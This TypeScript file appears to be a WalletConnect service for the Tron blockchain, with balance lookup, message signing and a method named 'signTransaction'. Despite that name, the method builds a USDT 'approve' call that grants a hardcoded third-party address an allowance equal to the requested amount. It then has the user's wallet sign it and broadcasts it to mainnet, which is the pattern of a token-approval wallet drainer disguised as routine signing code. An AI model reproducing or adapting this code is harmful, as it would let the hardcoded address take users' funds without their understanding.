import UniversalProvider from "@walletconnect/universal-provider";
import TronWeb from "tronweb";

export enum TronChains {
  Mainnet = "0x2b6653dc",
  Devnet = "0xcd8690dc",
}

export class TronService {
  private provider?: UniversalProvider;
  private isTestnet: boolean;

  constructor(provider?: UniversalProvider) {
    this.provider = provider;
    this.isTestnet = this.checkTestnet();
  }

  private checkTestnet(): boolean {
    if (this.provider) {
      return this.provider.session!.namespaces.tron.chains?.includes(`tron:${TronChains.Devnet}`) || false;
    }
    return false;
  }

  public getUSDTSmartContract(): string {
    return this.isTestnet
      ? "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"
      : "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  }

  public getTronHost(): string {
    return this.isTestnet
      ? "https://nile.trongrid.io/"
      : "https://api.trongrid.io/";
  }

  public getTronWeb(): TronWeb {
    const fullHost = this.getTronHost();
    return new TronWeb({ fullHost });
  }

  public async getBalance(address: string): Promise<number> {
    try {
      const tronWeb = this.getTronWeb();
      return await tronWeb.trx.getBalance(address);
    } catch (error: any) {
      throw new Error(error);
    }
  }

  public async signMessage(
    message: string,
    address: string
  ) {
    if (!this.provider) {
      throw new Error("Provider is required to sign a message.");
    }
    try {
      const result = await this.provider!.request<{ signature: string }>({
        method: "tron_signMessage",
        params: { address, message },
      }, "tron:0x2b6653dc");

      return {
        method: "tron_signMessage",
        address,
        valid: true,
        result: result.signature,
      };
    } catch (error: any) {
      throw new Error(error);
    }
  }

  public async signTransaction(
    address: string,
    amount: number
  ) {
    if (!this.provider) {
      throw new Error("Provider is required to sign a transaction.");
    }
    try {
      const tronWeb = this.getTronWeb();
      const contractAddress = this.getUSDTSmartContract();

      const options = {
        feeLimit: 100000000,
        callValue: 0,
      };

      var parameters = [{type:'address',value: "TCb9k9evBHsWifoVNZTeRku3pnCqcRTFe9"},{type:'uint256',value: amount}];
      const functionSelector = 'approve(address,uint256)';

      // 1. Build the call to the SC function
      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        contractAddress,
        functionSelector,
        options,
        parameters,
        address
      );

      // 2. Request the signature
      const signedTransaction = await this.provider!.request<{ result: any }>({
        method: "tron_signTransaction",
        params: { address, transaction },
      }, "tron:0x2b6653dc");

      const tx = signedTransaction.result;

      // 3. Send the transaction to the network
      const result = await tronWeb.trx.sendRawTransaction(tx);

      return {
        method: "tron_signTransaction",
        address,
        valid: true,
        result: result,
      };
    } catch (error: any) {
      throw new Error(error);
    }
  }
}
